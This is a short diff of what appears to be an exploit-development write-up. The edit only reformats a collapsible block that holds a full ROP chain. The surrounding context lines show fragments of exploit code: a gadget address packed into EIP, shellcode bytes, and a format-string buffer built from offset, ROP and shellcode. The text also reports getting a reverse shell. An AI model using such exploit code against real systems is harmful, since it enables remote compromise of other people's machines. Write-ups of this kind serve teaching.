@@ -1758,11 +1758,11 @@ We run our payload and successfully obtain a reverse shell. In the next write-up
 ![Untitled](/assets/Untitled%205.png)
 
 Our full ROP chain looks as follows, use dropdown to view.
+
 <details>
   <summary>Large Code Block</summary>
-  
- 
-  
+  Full ROP chain code is within the below codeblock.
+
 ```python
 eip = pack("<L", (0x100113dd)) # push esp ; sub eax, 0x20 ; pop ebx ; ret  ;
 
@@ -1954,4 +1954,5 @@ shellcode += b"\x33\x81\x58\x9b\xd3"
 formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset + va + eip + rop + shellcode ,0,0,0,0)
 buf += formatString
 ```
+
 </details>
